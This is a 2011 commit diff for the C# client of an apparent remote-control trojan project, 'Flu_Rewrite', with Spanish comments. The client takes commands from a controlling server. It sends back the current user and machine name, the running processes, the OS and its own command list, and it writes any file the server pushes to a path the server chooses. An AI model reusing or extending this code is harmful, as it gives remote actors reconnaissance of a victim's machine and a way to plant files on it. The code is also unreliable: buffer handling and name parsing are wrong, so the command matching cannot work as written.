2713e945f778985c16700407c2cfdaf6df761ead
drkguy.personal@gmail.com <drkguy.personal@gmail.com@433dea7d-b61d-82f5-db5e-89b8c9dc7a0b>
2011-01-20 18:48:32 +0000

    Client Draft #1

--- Flu_Rewrite/ClienteSockets.cs
+++ Flu_Rewrite/ClienteSockets.cs
@@ -2,6 +2,10 @@
 using System.Net.Sockets;
 using System.Threading;
 using System.IO;
+using System.Text;
+using System.Security.Principal;
+using System.Diagnostics;
+using System.Reflection;
 
 namespace Flu_Rewrite
 {
@@ -12,13 +16,9 @@ namespace Flu_Rewrite
 
         //Es la magia que nos permite comunicarnos con el servidor :)
         private TcpClient Cliente;
-        //Nos permite enviar y recibir datos en la conexion
-        private NetworkStream Stream;
-        //Sube datos al servidor
-        private StreamWriter Escritor;
-        //Baja datos del servidor
-        private StreamReader Lector;
         //Este delegado se ejecutaria cada vez que recibamos un comando del servidor
+        //TODO: Esto deberia ser un evento que expong aun tipo con la informacion del comando
+        // y una variable para cancelar su ejecucin si un plugin asi lo desea [WPF Style]
         public delegate Boolean ComandoRecibido(Boolean Interno, String Comando, String Parametros);
 
         //En un futuro se implementara UPnP para poder aleatorizar el puerto :D
@@ -29,22 +29,63 @@ namespace Flu_Rewrite
 
         public void LoopPrincipal()
         {
-            Stream = Cliente.GetStream();
-            Escritor = new StreamWriter(Stream);
-            Lector = new StreamReader(Stream);
+            Byte[] Buffer = new Byte[2048];
             while (true)
             {
-                //Si hay un nuevo comando...
-                if (Lector.ReadLine() == "Pendiente")
+                Cliente.Client.Receive(Buffer);
+                String Comando = Encoding.ASCII.GetString(Buffer);
+                switch (Comando)
                 {
-                    //Enviar un mensaje de confirmacion...
-                    Escritor.WriteLine("OK");
-                    Escritor.Flush();
-                    //Leemos el comando...
-                    String Comando = Lector.ReadLine();
-                    //Deberia haber algo aqui, pero primero tengo que escribir el otro lado de la ecuacion y definir un protocolo XD
+                    case "Usuario":
+                        Cliente.Client.Send(Encoding.ASCII.GetBytes(WindowsIdentity.GetCurrent().Name.Split(' ')[1]));
+                        break;
+                    case "Maquina":
+                        Cliente.Client.Send(Encoding.ASCII.GetBytes(WindowsIdentity.GetCurrent().Name.Split(' ')[0]));
+                        break;
+                    case "Procesos":
+                        Cliente.Client.Send(Encoding.ASCII.GetBytes(ObtenerProcesos()));
+                        break;
+                    case "SO":
+                        Cliente.Client.Send(Encoding.ASCII.GetBytes(Environment.OSVersion.Platform.ToString()));
+                        break;
+                    case "Funciones":
+                        Cliente.Client.Send(Encoding.ASCII.GetBytes(ObtenerFunciones()));
+                        break;
+                    case "Archivo":
+                        try { RecibirArchivo(); Cliente.Client.Send(Encoding.ASCII.GetBytes("OK")); }
+                        catch (Exception ex) { Cliente.Client.Send(Encoding.ASCII.GetBytes("Error" + ex.Message)); }
+                        break;
                 }
             }
+        }
+
+        public String ObtenerProcesos()
+        {
+            String Retorno = "";
+            Process[] Procesos = Process.GetProcesses();
+            foreach (Process P in Procesos) Retorno += P.ProcessName + " ?";
+            return Retorno;
+        }
+
+        //Esto es mejor no escribirlo explicitamente para no tener que modificar 
+        //el servidor cada vez que se implemente una funcion nueva
+        public String ObtenerFunciones()
+        {
+            //Reflexion... http://msdn.microsoft.com/es-es/library/ms173183%28v=VS.100%29.aspx
+            String Retorno = "";
+            Type Comandos = typeof(ComandosInternos);
+            MethodInfo[] Metodos = Comandos.GetMethods();
+            foreach (MethodInfo Metodo in Metodos) Retorno += Metodo.Name + " ?";
+            return Retorno;
+        }
+
+        public void RecibirArchivo()
+        {
+            Byte[] Nombre = new Byte[2048];
+            Byte[] Archivo = new Byte[2048];
+            Cliente.Client.Receive(Nombre);
+            Cliente.Client.Receive(Archivo);
+            File.WriteAllBytes(Encoding.ASCII.GetString(Nombre), Archivo);
         }
     }
 }
